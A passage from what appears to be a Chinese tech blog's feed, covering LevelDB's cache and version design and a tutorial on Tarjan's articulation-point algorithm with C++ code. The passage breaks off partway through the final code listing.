Cache"></a>9. Cache</h2><p>读取操作如果没有在内存的 memtable 中找到记录，要多次进行磁盘访问操作。假设最优情况，即第一次就在 level 0 中最新的文件中找到了这个 key，那么也需要读取2次磁盘，一次是将 SSTable 的文件中的 index 部分读入内存，这样根据这个 index 可以确定 key 是在哪个 block 中存储；第二次是读入这个 block 的内容，然后在内存中查找 key 对应的 value。</p><p>LevelDB 中引入了两个不同的 Cache:Table Cache 和 Block Cache。其中 Block Cache 是配置可选的，即在配置文件中指定是否打开这个功能。</p><p>下图是 table cache 的结构：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-14.png" alt="SSTable compaction"></p><p>在 Cache 中，key值是 SSTable 的文件名称，value 部分包含两部分，一个是指向磁盘打开的 SSTable 文件的文件指针，这是为了方便读取内容；另外一个是指向内存中这个 SSTable 文件对应的 Table 结构指针，table结构在内存中，保存了 SSTable 的 index 内容以及用来指示 block cache 用的 cache_id ，当然除此外还有其它一些内容。</p><p>比如在 get(key) 读取操作中，如果 LevelDB 确定了key在某个level下某个文件A的key range范围内，那么需要判断是不是文件A真的包含这个KV。此时，LevelDB 会首先查找 Table Cache，看这个文件是否在缓存里，如果找到了，那么根据 index 部分就可以查找是哪个 block 包含这个 key。如果没有在缓存中找到文件，那么打开 SSTable 文件，将其 index 部分读入内存，然后插入 Cache 里面，去 index 里面定位哪个 block 包含这个 key 。如果确定了文件哪个 block 包含这个 key，那么需要读入 block 内容，这是第二次读取。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-15.png" alt="SSTable compaction"></p><p>Block Cache是为了加快这个过程的。上图是block cache 的结构。其中的key是文件的cache_id加上这个block在文件中的起始位置block_offset。而value则是这个Block的内容。</p><p>如果 LevelDB发现这个 block 在 block cache 中，那么可以避免读取数据，直接在 cache 里的 block 内容里面查找key的value就行，如果没找到呢？那么读入 block 内容并把它插入 block cache 中。LevelDB 就是这样通过两个 cache 来加快读取速度的。从这里可以看出，如果读取的数据局部性比较好，也就是说要读的数据大部分在cache里面都能读到，那么读取效率应该还是很高的，而如果是对key进行顺序读取效率也应该不错，因为一次读入后可以多次被复用。但是如果是随机读取，您可以推断下其效率如何。</p><h2 id="10-Version"><a href="#10-Version" class="headerlink" title="10. Version"></a>10. Version</h2><p><strong>Version</strong> 保存了当前磁盘以及内存中所有的文件信息，一般只有一个 Version 叫做 “current” version（当前版本）。LevelDB还保存了一系列的历史版本，这些历史版本有什么作用呢？</p><p>当一个 Iterator 创建后，Iterator 就引用到了 current version(当前版本)，只要这个 Iterator 不被 delete 那么被 Iterator 引用的版本就会一直存活。这就意味着当你用完一个 Iterator 后，需要及时删除它。</p><p>当一次 Compaction 结束后（会生成新的文件，合并前的文件需要删除），LevelDB 会创建一个新的版本作为当前版本，原先的当前版本就会变为历史版本。</p><p><strong>VersionSet</strong> 是所有 Version的集合，管理着所有存活的 Version。</p><p><strong>VersionEdit</strong> 表示 Version 之间的变化，相当于 delta 增量，表示有增加了多少文件，删除了文件。他们之间的关系如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Version0 +VersionEdit--&gt;Version1</span><br></pre></td></tr></table></figure><p>VersionEdit 会保存到 manifest 文件中，当做数据恢复时就会从 manifest 文件中读出来重建数据。</p><p>这其实是一种MVCC思想的实现。后续</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-前言&quot;&gt;&lt;a href=&quot;#0-前言&quot; class=&quot;headerlink&quot; title=&quot;0. 前言&quot;&gt;&lt;/a&gt;0. 前言&lt;/h2&gt;&lt;p&gt;本系列文章是对leveldb源码分析的笔记，基本会包含leveldb中的方方面面。阅读过程中，参照网上各博客并加上了个人的理解，所以难免有错，如有错误还请告知。&lt;/p&gt;
&lt;p&gt;如果你是刚开始看leveldb，我希望你对LSM有一定的概念。为了避免过度陷入代码细节，本文将解释leveldb的整体设计架构，各个组件的宏观设计，这样能在心里对leveldb有个轮廓，也能指导我们从哪里入手代码。&lt;/p&gt;
&lt;p&gt;本文非写者编辑，转载自：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2NpZ2hhby5jb20vMjAxNi8wOC8xNC9sZXZlbGRiLXNvdXJjZS1hbmFseXNpcy0wMi1zdHJ1Y3R1cmUv&quot; title=&quot;http://cighao.com/2016/08/14/leveldb-source-analysis-02-structure/&quot;&gt;http://cighao.com/2016/08/14/leveldb-source-analysis-02-structure/&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>Tarjan算法详解</title>
    <link href="https://www.ravenxrz.ink/archives/ed32a852.html"/>
    <id>https://www.ravenxrz.ink/archives/ed32a852.html</id>
    <published>2020-09-20T04:23:12.000Z</published>
    <updated>2020-09-20T04:30:23.840Z</updated>
    
    <content type="html"><![CDATA[<p>今天来说说tarjan算法，一种用于求解连通图的关键点算法。</p><a id="more"></a><h2 id="1-什么是关节点？"><a href="#1-什么是关节点？" class="headerlink" title="1.什么是关节点？"></a>1.什么是关节点？</h2><p>假设现在有一个连通图，在去掉这个图中的某个节点后，连通分量增加，那么这个节点就是关节点。如下图的3去掉后，整个图拆分为了4个连通分量{1,2,4,5}</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920111152803.png" alt="image-20200920111152803" style="zoom: 67%;" /><h2 id="2-求解关键点"><a href="#2-求解关键点" class="headerlink" title="2.求解关键点"></a>2.求解关键点</h2><h3 id="1-暴力法"><a href="#1-暴力法" class="headerlink" title="1. 暴力法"></a>1. 暴力法</h3><p>如果在没有学习过tarjan算法前，求解一个图的关键点最直观的方法就是暴力求解。可以分别在原连通图中去掉一点，然后用dfs或bfs遍历，若在去掉某个的点后，整个图的连通度有所增加，则该点一定是个关键点。伪代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;node1,node2...noden&#125;</span><br><span class="line">去掉nodei</span><br><span class="line">求解当前图的连通度</span><br><span class="line">if 连通度增加</span><br><span class="line">nodei 是关键点</span><br><span class="line">复原nodei</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>显然，包利发虽然简单，但是复杂度较高。下面我们来看tarjan算法。</p><h3 id="2-tarjan算法"><a href="#2-tarjan算法" class="headerlink" title="2. tarjan算法"></a>2. tarjan算法</h3><p><strong>回边概念</strong></p><p>为了说明方便，我们以下图为例：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920111908187.png" alt="image-20200920111908187" style="zoom:67%;" /><p>现在，我们从0开始对这个图做一个dfs<strong>先序</strong>遍历，可以得到<strong>深度优先搜索树</strong>如下：</p><img data-src="https://pic.downk.cc/item/5f674a36160a154a67fe2e78.png" alt="image-20200920112158018" style="zoom:50%;" /><p>这个图和上个图唯一的区别在于将1-3的边改为了红色，因为实际遍历过程中，不会经过这条边，我们把这种在dfs遍历中不会经过的边但又实际存在图中的边称为<strong>“回边“</strong>。</p><p>ok，有了回边的概念，现在说明我们应该如何确定连通图中的关键点：</p><blockquote><p>以下摘自: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbnVsbHp4L3AvNzk2ODExMC5odG1s" title="https://www.cnblogs.com/nullzx/p/7968110.html">https://www.cnblogs.com/nullzx/p/7968110.html<i class="fa fa-external-link"></i></span></p></blockquote><p>假设DFS中我们从顶点U访问到了顶点V（此时顶点V还未被访问过），那么我们称顶点U为顶点V的父顶点，V为U的孩子顶点。在顶点U之前被访问过的顶点，我们就称之为U的祖先顶点。</p><p>显然如果顶点U的<strong>所有孩子顶点</strong>可以不通过父顶点U而访问到U的祖先顶点，那么说明此时去掉顶点U不影响图的连通性，U就不是割点。相反，如果顶点U<strong>至少存在一个孩子顶点</strong>，必须通过父顶点U才能访问到U的祖先顶点，那么去掉顶点U后，顶点U的祖先顶点和孩子顶点就不连通了，说明U是一个割点。</p><p><img data-src="https://pic.downk.cc/item/5f674a53160a154a67fe3be6.png" alt="image-20200920112749317"></p><p>上图中的箭头表示DFS访问的顺序（而不表示有向图），对于顶点D而言，D的孩子顶点可以通过连通区域1红色的边回到D的祖先顶点C（此时C已被访问过），所以此时D不是割点。</p><p><img data-src="https://pic.downk.cc/item/5f674a76160a154a67fe4a72.png" alt="image-20200920112807700"></p><p>上图中的连通区域2中的顶点，必须通过D才能访问到D的祖先顶点，所以说此时D为割点。再次强调一遍，箭头仅仅表示DFS的访问顺序，而不是表示该图是有向图。</p><p>除了上述情况，我们还应该考虑一个特殊情况，那就是DFS的根节点，因为根节点没有祖先节点。其实根顶点是不是割点也很好判断，如果从根顶点出发，一次DFS就能访问到所有的顶点，那么根顶点就不是割点。反之，如果回溯到根顶点后，还有未访问过的顶点，需要在邻接顶点上再次进行DFS，根顶点就是割点。</p><p>所以，tarjan算法的核心可以总结如如下两条规则：</p><ol><li>对于dfs生成树的根节点，如果根节点存在两颗或者两颗以上的子树，则该该节点必为关键点。</li><li>对于非叶子节点v，若v的子树中的所有节点均无指向v的祖先节点的回边，则v为关键点。</li></ol><p>对于规则1,非常好判断。所以主要说一下规则2：</p><p>要实现规则2，我们需要三个辅助数组：</p><ol><li>dfn[n]数组</li></ol><p>dfn数组的下标表示图中定点的编号，数组中的值表示dfs中的遍历顺序（访问时间戳）。每访问到一个未访问过的顶点，访问顺序的值（时间戳）就增加1。子顶点的dfn值一定比父顶点的dfn值大（但不一定恰好大1，比如父顶点有两个及两个以上分支的情况）。在访问一个顶点后，它的dfn的值就确定下来了，不会再改变。</p><ol start="2"><li>low数组</li></ol><p>low数组的下标表示顶点的编号，数组中的值表示DFS中该顶点<strong>不通过父顶点</strong>能访问到的祖先顶点中最小的顺序值（或者说时间戳）。</p><blockquote><p>想一下，为什么不能通过父顶点来访问父顶点的祖先顶点？</p><p>因为我们是要判断父节点是不是关键点，如果以父节点做中间访问点就没有意义了。</p></blockquote><p>请好好理解low数组，因为它是tarjan算法的核心。</p><ol start="3"><li>parent数组</li></ol><p>parent数组的下标标识顶点的编号，数组中的值表示该顶点的父节点编号。主要用于辅助low数组的计算，再次说明low数组的含义是节点不通过其父节点能够访问的最小祖先节点的时间戳。</p><h3 id="3-看一个例子"><a href="#3-看一个例子" class="headerlink" title="3. 看一个例子"></a>3. 看一个例子</h3><p>图片摘自：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbnVsbHp4L3AvNzk2ODExMC5odG1s" title="https://www.cnblogs.com/nullzx/p/7968110.html">https://www.cnblogs.com/nullzx/p/7968110.html<i class="fa fa-external-link"></i></span></p><p>可见，最难计算的是low数组。下面以一个具体的例子来说明如何计算dfn和low数组：</p><p>下图中蓝色实线箭头表示已访问过的路径，无箭头虚线表示未访问路径。已访问过的顶点用黄色标记，未访问的顶点用白色标记，DFS当前正在处理的顶点用绿色表示。带箭头的蓝色虚线表示DFS回溯时的返回路径。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920114204133.png" alt="image-20200920114204133"></p><p>假设从A点出发，当前遍历到I节点，注意dfn数组是如何计算的，只要dfs前进一步，dfn就会+1. low数组的初始值和dfn相同。</p><p>当前节点为I，I想继续往前，但是发现D已经被遍历过了，于是（I，D）形成一个回边，且D不是I的父亲节点。所以我们可以更新I的low值，具体更新规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(low[I] &gt; dfn[D] )</span><br><span class="line"></span><br><span class="line">  low[I] &#x3D; dfn[D]</span><br></pre></td></tr></table></figure><p>所以现在I的low值为4，</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200920114503369.png" alt="image-20200920114503369"></p><p>现在I没有其他连接点，所以回退到H，H发现可以通过I到达D，且D不是H的父亲节点。于是可以更新H的low值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(low[I] &lt; dfn[H] &amp;&amp; low[I] !&#x3D; dfn[parent[D]])</span><br><span class="line"> low[H] &#x3D; low[I]</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5f674a8b160a154a67fe53eb.png" alt="image-20200920115233737"></p><p>现在H继续向前到J：</p><p><img data-src="https://pic.downk.cc/item/5f674aa4160a154a67fe5edb.png" alt="image-20200920115330764"></p><p><img data-src="https://pic.downk.cc/item/5f674acc160a154a67fe71ab.png" alt="image-20200920115344808"></p><p>同理，由DFS访问顶点B，dfn[J] &gt; dfn[B]，B为祖先顶点，顶点J不经过父顶点H能访问到的最早时间戳就是dfn[B]，即low[J] = 2</p><p><img data-src="https://pic.downk.cc/item/5f674ae1160a154a67fe7b26.png" alt="image-20200920115401233"></p><p>我们从顶点J回溯到顶点H，显然到目前为止顶点H能访问到的最早时间戳就更新为2（因为我们到现在为止知道了能从H访问到J），所以low[H] = 2。</p><p>ok，后面重新回溯到G-&gt;F-&gt;E, 剩下的过程（访问K和L）和上面类似，不再赘述。</p><h3 id="4-tarjan-C-实现"><a href="#4-tarjan-C-实现" class="headerlink" title="4. tarjan C++实现"></a>4. tarjan C++实现</h3><p>既然核心的部分已经理解了，代码写起来就相对容易了。</p><p>1.首先声明几个辅助数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; visited;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dfn;         <span class="comment">/*第一次访问到第idx个节点时的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; low;         <span class="comment">/*第idx个节点及其子树能够回溯到的最小节点处的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; parent;      <span class="comment">/*第idx个节点的父亲节点*/</span></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; joint_node;      <span class="comment">/* 保存关节点 */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>初始化图</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* create graph from the input file */</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;&amp;link_graph = create_link_graph();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">create_link_graph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">string</span> <span class="title">path</span><span class="params">(<span class="string">"/home/raven/Projects/Clion/MyLeetCode/0.数据结构/6.图/tarjan_input1.txt"</span>)</span></span>;</span><br><span class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(path)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!fin.is_open()) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> node_num;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">line</span>;</span><br><span class="line">    fin &gt;&gt; node_num;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">link_graph</span><span class="params">(node_num, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (getline(fin, <span class="built_in">line</span>)) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="built_in">line</span>.find_first_of(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="built_in">std</span>::<span class="built_in">string</span>::npos) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> num_str = <span class="built_in">line</span>.substr(<span class="number">0</span>, i); <span class="comment">/* 序号 */</span></span><br><span class="line">        <span class="built_in">string</span> connect_node = <span class="built_in">line</span>.substr(i + <span class="number">1</span>, <span class="built_in">line</span>.<span class="built_in">size</span>() - i);   <span class="comment">/* 想连接的点 */</span></span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream1</span><span class="params">(num_str)</span></span>;</span><br><span class="line">        sstream1 &gt;&gt; i;</span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream2</span><span class="params">(connect_node)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 初始化与 i 相连的node */</span></span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line">        <span class="keyword">while</span> (sstream2 &gt;&gt; temp) &#123;</span><br><span class="line">            link_graph[i].push_back(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> link_graph;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：tarjan_input1.txt文件如下:</p><p>首行代表节点个数，其余行代表从一个链链表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">0: 1</span><br><span class="line">1: 0 2 3</span><br><span class="line">2: 1 3</span><br><span class="line">3: 1 2 4 5</span><br><span class="line">4: 3</span><br><span class="line">5: 3</span><br></pre></td></tr></table></figure><p>这里采用邻接链表的方式保存图， 原图如下：</p><img data-src="https://pic.downk.cc/item/5f674af8160a154a67fe8508.png" alt="image-20200920120055167" style="zoom:67%;" /><ol start="3"><li>tarjan算法</li></ol><p>显然tarjan算法和dfs算法有联系：我们把dfs的框架搭起来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> cur_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;</span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connaected_node : graph[cur_node])&#123;</span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在在这个框架上改：</p><ol><li><p>low,parent,dfn数组的初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;<span class="comment">/* 这个作用域暂时不修改 */</span></span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">         parent[cur_node] = from_node;</span><br><span class="line">         dfn[cur_node] = ++counter;</span><br><span class="line">         low[cur_node] = dfn[cur_node];<span class="comment">/* low初始值和dfn相同 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connected_node : graph[cur_node])&#123;</span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>回边情况</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;<span class="comment">/* 第一部分：这个作用域暂时不修改 */</span></span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">         parent[cur_node] = from_node;</span><br><span class="line">         dfn[cur_node] = ++counter;</span><br><span class="line">         low[cur_node] = dfn[cur_node];<span class="comment">/* 第一部分：low初始值和dfn相同 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connected_node : graph[cur_node])&#123;</span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">/* 第二部分：cur_node 已经是访问过的点，说明(from_node, to_node)这条边是回边，可能需要更新low数组 */</span></span><br><span class="line">        <span class="keyword">if</span>(to_node != parent[cur_node] &amp;&amp; low[from_node] &gt; dfn[to_node])&#123;</span><br><span class="line">             low[cur_node] = dfn[to_node];</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>dfs 从深节点回溯到浅节点的情况</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;<span class="comment">/* 第一部分：这个作用域暂时不修改 */</span></span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">         parent[cur_node] = from_node;</span><br><span class="line">         dfn[cur_node] = ++counter;</span><br><span class="line">         low[cur_node] = dfn[cur_node];<span class="comment">/* 第一部分：low初始值和dfn相同 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connected_node : graph[cur_node])&#123;</span><br><span class="line">            <span class="keyword">if</span>(connected_node == from_node) <span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">            <span class="comment">/* 第三部分：从dfs中回溯回来 */</span></span><br><span class="line">            <span class="keyword">if</span>(low[connected_node] != dfn[parent[cur_node]] &amp;&amp;<span class="comment">/* 第三部分：子树的回边节点时间戳不是本节点的父节点的时间戳 */</span></span><br><span class="line">              low[connected_node] &lt; dfn[cur_node])&#123;<span class="comment">/*  第三部分：子树的回边节点时间戳小于当前节点的时间戳 */</span></span><br><span class="line">                 low[cur_node] = <span class="built_in">min</span>(low[cur_node],low[connected_node]);<span class="comment">/*第三部分：min函数是为了保证在cur_node的多个子树中选择最小的那个*/</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(low[connected_node] &gt; dfn[cur_node])&#123;<span class="comment">/* 第三部分： 子树中存在节点必须经过cur_node才能回到上层 */</span></span><br><span class="line">                joint_node.insert(cur_node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">/* 第二部分：cur_node 已经是访问过的点，说明(from_node, to_node)这条边是回边，可能需要更新low数组 */</span></span><br><span class="line">        <span class="keyword">if</span>(to_node != parent[cur_node] &amp;&amp; low[from_node] &gt; dfn[to_node])&#123;</span><br><span class="line">             low[cur_node] = dfn[to_node];</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>root节点单独处理</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* root node单独处理 */</span></span><br><span class="line"><span class="keyword">int</span> child_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> connected_node : link_graph[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!visited[connected_node])&#123;</span><br><span class="line">        child_num++;</span><br><span class="line">        dfs(link_graph, <span class="number">0</span>, connected_node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(child_num&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">        joint_node.insert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>完整代码</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 